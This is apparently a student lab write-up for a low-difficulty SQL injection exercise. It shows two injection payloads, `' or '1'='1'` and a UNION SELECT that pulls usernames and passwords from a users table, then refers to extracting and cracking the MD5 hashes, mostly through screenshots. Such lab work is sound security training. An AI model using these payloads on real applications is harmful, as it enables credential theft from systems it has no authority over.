# SQLi (low)
## Assigment 11

### There is a user input to find the username and password of the id
![](./pics/1.png)
### Viewing the code
![](./pics/2.png)
### Injection sql code `' or '1'='1'`
![](./pics/3.png)
![](./pics/4.png)
### Injection sql code `1' OR 1=1 UNION SELECT user, password FROM users #`
![](./pics/5.png)
![](./pics/6.png)
### Extracting the MD5 hashes
![](./pics/7.png)
### Cracking the hashes
![](./pics/8.png)
![](./pics/9.png)